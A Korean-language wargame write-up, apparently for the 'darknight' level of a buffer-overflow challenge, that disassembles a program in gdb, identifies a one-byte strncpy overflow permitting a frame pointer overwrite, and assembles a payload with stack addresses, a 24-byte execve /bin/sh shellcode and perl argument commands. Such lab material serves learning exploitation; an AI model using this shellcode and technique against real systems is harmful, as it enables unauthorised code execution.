[gdb 분석]

(gdb) disas main
Dump of assembler code for function main:
0x804846c <main>:       push   %ebp
0x804846d <main+1>:     mov    %ebp,%esp
-> main 프롤로그
0x804846f <main+3>:     cmp    DWORD PTR [%ebp+8],1
0x8048473 <main+7>:     jg     0x8048490 <main+36>
-> if문
0x8048475 <main+9>:     push   0x8048504
0x804847a <main+14>:    call   0x8048354 <printf>
0x804847f <main+19>:    add    %esp,4
->printf("0x8048504");
0x8048482 <main+22>:    push   0
0x8048484 <main+24>:    call   0x8048364 <exit>
0x8048489 <main+29>:    add    %esp,4
-> exit(0)
0x804848c <main+32>:    lea    %esi,[%esi*1]
0x8048490 <main+36>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048493 <main+39>:    add    %eax,4
0x8048496 <main+42>:    mov    %edx,DWORD PTR [%eax]
0x8048498 <main+44>:    push   %edx
0x8048499 <main+45>:    call   0x8048440 <problem_child>
0x804849e <main+50>:    add    %esp,4
-> problem_child(argv[1]);
0x80484a1 <main+53>:    leave
0x80484a2 <main+54>:    ret
-> 함수 에필로그
0x80484a3 <main+55>:    nop
0x80484a4 <main+56>:    nop
-> 변수는 없음.
-> 서브 함수가 존재하므로 FPO취약점 예상 가능.
---------------------------------------------------
(gdb) disas 0x8048440 <problem_child>
Dump of assembler code for function problem_child:
0x8048440 <problem_child>:      push   %ebp
0x8048441 <problem_child+1>:    mov    %ebp,%esp
0x8048443 <problem_child+3>:    sub    %esp,40
-> promblem_child() 함수 프롤로그 + 변수 40byte 할당
0x8048446 <problem_child+6>:    push   41
0x8048448 <problem_child+8>:    mov    %eax,DWORD PTR [%ebp+8]
0x804844b <problem_child+11>:   push   %eax
0x804844c <problem_child+12>:   lea    %eax,[%ebp-40]
0x804844f <problem_child+15>:   push   %eax
0x8048450 <problem_child+16>:   call   0x8048374 <strncpy>
0x8048455 <problem_child+21>:   add    %esp,12
-> strncpy([%ebp-40], ([%ebp+8]; 인자), 41)
-> SFP 오버플로우 가능, FPO 발생 가능.
0x8048458 <problem_child+24>:   lea    %eax,[%ebp-40]
0x804845b <problem_child+27>:   push   %eax
0x804845c <problem_child+28>:   push   0x8048500
0x8048461 <problem_child+33>:   call   0x8048354 <printf>
0x8048466 <problem_child+38>:   add    %esp,8
-> printf("0x8048500",[%ebp-40]);
0x8048469 <problem_child+41>:   leave
0x804846a <problem_child+42>:   ret
-> promblem_child() 함수 에필로그
0x804846b <problem_child+43>:   nop
End of assembler dump.


[페이로드 작성]

지역변수 buffer의 주소
:

0xbffffa04:     0xbffffa3c      0x08048466      0x08048500      0xbffffa14
0xbffffa14:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa24:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffa34:     0x41414141      0x41414141      0xbffffa42      0x0804849e
0xbffffa44:     0xbffffb9f      0xbffffa68      0x400309cb      0x00000003

-> buffer의 시작 주소가 0xbffffa14이므로, (sub)SFP에 들어갈 값은 
    0xbffffa14에서 -4를 한 0xbffffa10이면 될 것이다.

argv[2]의 주소(100+24+50 byte 기준):
0xbffffbd4 ~ 0xbffffc64정도,


(problem_child()의 메모리 구조)          			        (main()..)
buffer[40] + SFP[4] + RET[4] + (argv[1]의 주소(인자))[4]    +     SFP[4] + RET[4]+ argc....
"\xcf\xfc\xff\xbf","\x90"x36,"\x90"

쉘(24byte):
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80

./darknight
argc1:
`perl -e 'print "\xd8\xfb\xff\xbf","\x90"x36,"\x10"'`
argv2:
`perl -e 'print "\x90"x100,"-","\x90"x50'`


